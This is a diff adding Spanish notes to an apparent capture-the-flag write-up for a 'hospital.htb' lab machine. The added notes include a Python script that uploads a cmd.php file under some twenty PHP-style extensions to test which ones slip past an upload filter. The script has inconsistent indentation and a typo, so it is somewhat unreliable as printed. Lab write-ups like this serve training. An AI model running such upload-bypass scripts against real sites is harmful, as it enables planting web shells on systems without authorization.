@@ -65,6 +65,53 @@ echo '.php , .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm
 	 2. De igual manera en "Grep - Extract" colocar 'load' selecionar /failed.php y poner ok
 	 3. Luego de eso empezamos con el ataque de fuerza bruta para ver posibles rutas
 
+- Creamos nuestro escript para detectar rutas validas.
+```
+<?php
+  echo "Hola probando";
+?>
+```
+
+ - Creamos un archi **.py** para enlistar los **.php** con el codigo de estado
+```
+#!/usr/bin/env python3
+
+import requests
+import signal
+import sys
+from termcolor import colored
+from pwn import *
+
+def def_handler(sig, frame):
+    print(colored(f"\n\n[!] Saliendo..\n", 'red'))
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+upload_url = "http://hospital.htb:8080/upload.php"
+cookies = {'PHPSESSID': 'gvsg96egu23t3hjdnlv1ssb6ve'}
+burp = {'http': 'http://127.0.0.1:8081'}
+extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]
+
+def fileUpload():
+    f = open("cmd.php", "r")
+    fileContent = f.read()
+
+    for extension in extensions:
+        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
+	r= requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
+        print(r.status_code)
+
+if __name__ == '__main__':
+    fileUpload()
+ 
+```
+>Si cambiamos `print(r.estatus_code)` por:
+>`if "failed" not in r.headers["Location"]:`
+>	    `print(colored(f"\n[+] Extensión {extension}: {r.headers['Location']}", 'green'))`
+- Podemos realizar la misma función que realizamos con **burpsuite** utilizando **python**, con esta ultima función nos enlista todas las rutas **succes.php**.
+
 - En la parte de scripts nos creamos el siguiente archivo **.py**
 ```
 nvim fileUpload.py
